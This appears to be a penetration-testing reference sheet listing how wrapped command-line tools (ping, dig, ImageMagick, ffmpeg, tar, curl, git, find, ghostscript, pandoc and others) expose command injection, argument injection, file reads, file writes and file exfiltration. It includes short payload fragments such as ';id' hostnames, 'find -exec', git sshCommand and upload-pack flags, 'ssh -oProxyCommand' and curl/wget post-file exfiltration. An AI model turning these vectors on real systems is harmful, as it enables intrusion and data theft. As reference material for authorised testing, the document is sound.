# Common Tool Sinks — what each wrapped binary actually lets you do

## ping / traceroute / nslookup / dig / host / whois — the classics

`ping -c4 $host`, `traceroute $host`, `nslookup $name`, `dig $name`,
`host $name`, `whois $name` — the canonical "network tool" surfaces.

| Tool | Injection surface |
|---|---|
| `ping` | `;`/`&`/`|`/`\n`/`$()`/backtick in host → shell |
| `ping` | flags in argv-position: `-c`, `-p` (payload pattern!), `-s`, `-I` — `-p` lets you control reply bytes |
| `traceroute` | same host-injection; `-s src` flag games |
| `nslookup`/`dig`/`host` | `;id`; `dig` flags `-x`, `@server`, `+options`, `-f file` (read!) |
| `whois` | `;id`; `-h host` option; `-p port` |
| `arp`/`netstat`/`ifconfig` | limited flags |

`dig -f file` reads a file of queries — arg-position file-read primitive.

## convert/magick/identify — ImageMagick wrapped

`convert "$f" out.png`, `identify "$f"`, `mogrify` —

- the FILENAME injection surface: `x.png;id` in the filename
- the CODER-directive content surface: `msl:`, `ephemeral:`, `label:@/file`,
  `@file` — ImageMagick's own language — `imagemagick-deep.md`
- `-format`/`%[exif:]` template params
- `convert` flags `-set`, `-define`, `-write` — the args position

## ffmpeg — media processing

`ffmpeg -i $file` —

- `-i` input can be `concat:`/`file:`/`http:`/`protocol:` URLs — the
  m3u8/`concat:` file-read classic (`skills/web-file-upload/references/video-audio-attacks.md`)
- filter graphs `-filter_complex`/`lavfi` — filter-script injection
- `-f`/`-c` format/codec flags

## tar/zip/unzip/7z — archive tools

- `tar xf $f` — entry-name traversal → `skills/web-file-upload/references/archive-attacks.md`
- `tar --checkpoint-action` — arg-injection → `argument-injection.md`
- `unzip $f -d $dir` — `$dir` path control; entry names
- `zip`/`unzip` `-P` password in args (leaks via ps)

## curl/wget/aria2c — fetch tools

- `curl $url` — URL control → SSRF + `-o` write
- `curl -o path` / `wget -O path` — file-write
- `--config`/`-K` config-file injection — flag+file
- `-F name=@file`/`--data @file`/`--post-file` — file exfil
- `wget --post-file` — exfil

## git — `git clone/fetch/pull/log/show`

- `git clone $url` — url=ssh://` with `-oProxyCommand`/`upload-pack`
- `git -c core.sshCommand='id' fetch` — config-flag exec
- `git fetch --upload-pack='id'` — classic
- `git show`/`log`/`diff` — read files
- `.git` file writes → `skills/web-file-upload/references/git-upload.md` shape

## exiftool / identify / ffmpeg-metadata — metadata reads

`exiftool $f` — CVE-2021-22204 DjVu eval chain; `-config file` flag exec.

## grep/find/locate/sed/awk — search tools

- `grep $pattern $file` — `;id` in pattern? If pattern is quoted? If
  pattern arg-position — `-e`/`--include`/`--exclude` flags; `-f file`
  reads pattern-file; `--` needed
- `find $dir` — `-exec` exec! `find $dir -exec sh -c id \;`
- `awk -f $file`/`sed -f $file`/`sed 's/x/e cmd/e'` — script exec
- `locate` — database read

## openssl / ssh / ssh-keygen — crypto tools

- `openssl x509 -in $f` — `-engine`/`-in` file read, `-passin env:`/`file:`
- `ssh -oProxyCommand=` — exec
- `ssh-keygen -f` — file access

## tex/pandoc/ps/pdf tools — document pipeline

- `pandoc $f -o out` — `--include`/`--lua-filter`/template exec
- `pdflatex`/`xelatex` `$f` — `\write18` shell escape (if enabled),
  `\input{/file}` file-read
- `gs $f` — `-dSAFER` bypass / `.libfile`/`%pipe%`/`%os%` device
- `wkhtmltopdf $url` — URL + file-read via `file://` iframes
- `mail`/`sendmail`/`msmtp` — `-C`/`-X`/config-file flags

## ffmpeg/imagemagick chaining — `;` inside codec params

`-i concat:a|b` — the `concat:` protocol's `|` joining — the sub-protocol
is the injection inside the -i arg even when argv-form.

## The "the tool itself has an exec flag" summary

Every tool above has a documented way to run commands via its flags —
`argument-injection.md` for the full list. The cmdi-skill overlap:
sometimes the tool's flag is the only exec path (argv-boundary-safe
apps).

## Falsifiers

- the fixed tool takes no exec/read/write-capable flag at your position
  AND no shell boundary

## Output to record

- the exact wrapped binary + version + which flag/field is yours
